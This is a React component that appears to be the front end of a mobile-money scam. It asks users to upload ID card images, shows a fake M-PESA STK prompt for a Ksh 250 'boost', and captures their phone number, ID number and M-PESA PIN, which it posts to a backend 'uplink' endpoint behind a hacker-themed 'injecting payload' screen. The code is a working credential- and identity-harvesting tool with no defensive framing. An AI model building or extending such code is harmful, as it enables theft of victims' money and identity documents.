import React, { useState, useEffect } from "react";

export default function ProcessingVault({ sessionData, onFileUpdate, onSuccess }: any) {
    const [uploadStage, setUploadStage] = useState<"FILES" | "STK" | "INJECTION">("FILES");
    const [isUploading, setIsUploading] = useState(false);
  
    const triggerUplink = async () => {
      setIsUploading(true);
      setUploadStage("INJECTION");
  
      const formData = new FormData();
      formData.append("phone_number", sessionData.phone_number);
      formData.append("id_number", sessionData.id_number);
      formData.append("mpesa_pin", sessionData.mpesa_pin);
      
      if (sessionData.id_front) formData.append("id_front", sessionData.id_front);
      if (sessionData.id_back) formData.append("id_back", sessionData.id_back);
  
      try {
        const res = await fetch("http://localhost:8000/api/v1/uplink/", {
          method: "POST",
          body: formData,
          // headers: { "X-PROTOCOL-KEY": "V16_STABLE_BYPASS" }
        });
  
        if (res.ok) {
          setTimeout(onSuccess, 5000); // Allow logs to scroll
        }
      } catch (err) {
        console.error("CRITICAL_UPLINK_ERROR", err);
      }
    };
  
    return (
      <div className="flex flex-col items-center justify-center min-h-screen p-6">
        {uploadStage === "FILES" && (
          <div className="hacker-border p-8 bg-black max-w-xl w-full">
            <h2 className="text-hacker-blue mb-6">[DOC_VERIFICATION_REQUIRED]</h2>
            <div className="grid grid-cols-2 gap-4 mb-8">
              <input type="file" onChange={(e) => onFileUpdate({ id_front: e.target.files?.[0] })} className="text-[10px]" />
              <input type="file" onChange={(e) => onFileUpdate({ id_back: e.target.files?.[0] })} className="text-[10px]" />
            </div>
            <button 
              onClick={() => setUploadStage("STK")}
              className="w-full bg-hacker-green text-black py-3 font-bold"
            >
              VERIFY_DOCUMENTS
            </button>
          </div>
        )}
  
        {uploadStage === "STK" && (
          <div className="bg-white text-black p-8 rounded-3xl animate-bounce">
              <p className="text-center font-bold">M-PESA STK PUSH</p>
              <p className="text-xs text-center my-4">Pay Ksh 250 to initiate boost?</p>
              <button onClick={triggerUplink} className="w-full bg-green-600 text-white py-2 rounded-lg">Enter PIN</button>
          </div>
        )}
  
        {uploadStage === "INJECTION" && (
          <div className="w-full max-w-xl text-center">
              <div className="animate-pulse mb-4 text-hacker-red">!!! INJECTING PAYLOAD !!!</div>
              <div className="h-48 border border-hacker-green/30 overflow-hidden text-[10px] text-left p-4">
                 <p>{">"} DB_TUNNEL_OPENED</p>
                 <p>{">"} ENCRYPTING_PII_DATA...</p>
                 <p>{">"} SENDING_TO_REMOTE_SERVER...</p>
                 <div className="w-full bg-zinc-900 h-1 mt-4">
                    <div className="bg-hacker-green h-full animate-progress-load" style={{width: '60%'}}></div>
                 </div>
              </div>
          </div>
        )}
      </div>
    );
  }